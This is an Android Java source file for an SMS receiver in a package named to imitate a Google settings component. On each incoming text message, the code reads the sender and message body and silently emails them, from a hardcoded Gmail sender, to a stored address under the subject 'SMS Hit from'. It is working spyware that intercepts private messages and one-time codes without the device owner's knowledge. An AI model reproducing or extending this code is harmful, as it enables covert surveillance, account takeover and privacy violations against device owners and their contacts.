package com.android.google.settings;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.theah64.safemail.SafeMail;

public class SMSReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        final String action = intent.getAction();
        if (action != null && action.equals("android.provider.Telephony.SMS_RECEIVED")) {

            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from = "";
            if (bundle != null) {
                //---retrieve the SMS message received---
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        final String email = PrefHelper.getInstance(context).getString(PrefHelper.KEY_EMAIL);
                        if (email != null) {
                            SafeMail.sendMail("mymailer64@gmail.com", email,
                                    "SMS Hit from :" + msg_from,
                                    msgBody,
                                    new SafeMail.SafeMailCallback() {
                                        @Override
                                        public void onSuccess() {
                                            Log.i("theapache64", "SMS Sent");
                                        }

                                        @Override
                                        public void onFailed(Throwable throwable) {
                                            Log.e("theapache64", "SMS not sent");
                                            throwable.printStackTrace();
                                        }
                                    }

                            );
                        } else {
                            Log.e("SMSReceiver", "No email defined");
                        }
                    }


                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }


    }
}
